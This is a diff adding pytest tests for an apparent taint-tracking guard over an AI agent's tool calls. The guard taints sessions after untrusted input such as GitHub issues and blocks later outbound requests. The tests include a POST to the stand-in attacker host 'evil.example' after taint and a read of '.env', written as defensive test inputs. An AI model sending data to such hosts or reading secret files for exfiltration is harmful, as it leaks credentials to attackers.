@@ -81,3 +81,27 @@ def test_audit_log_written(guard, project):
     guard.check("read_file", {"path": ".env"})
     lines = (project / "audit.jsonl").read_text().strip().splitlines()
     assert len(lines) == 2 and '"deny"' in lines[1]
+
+
+def test_fail_closed_unknown_source_taints(guard):
+    # A tool not in trusted_sources taints the session, even if we never classified it.
+    guard.check("read_github_issue", {"number": 1})
+    assert guard.taint.tainted
+
+
+def test_trusted_tools_do_not_taint(guard):
+    guard.check("read_file", {"path": "bank/interest.py"})
+    guard.check("list_files", {})
+    guard.check("shell", {"cmd": "ls"})
+    assert not guard.taint.tainted
+
+
+def test_shell_fetching_network_taints(guard):
+    guard.check("shell", {"cmd": "curl https://pypi.org/simple/requests/"})
+    assert guard.taint.tainted
+
+
+def test_tainted_unknown_host_reason_names_taint_source(guard):
+    guard.check("read_github_issue", {"number": 42})
+    d = guard.check("http_request", {"method": "POST", "url": "https://evil.example/x"})
+    assert not d.allowed and "tainted" in d.reason and "evil.example" in d.reason
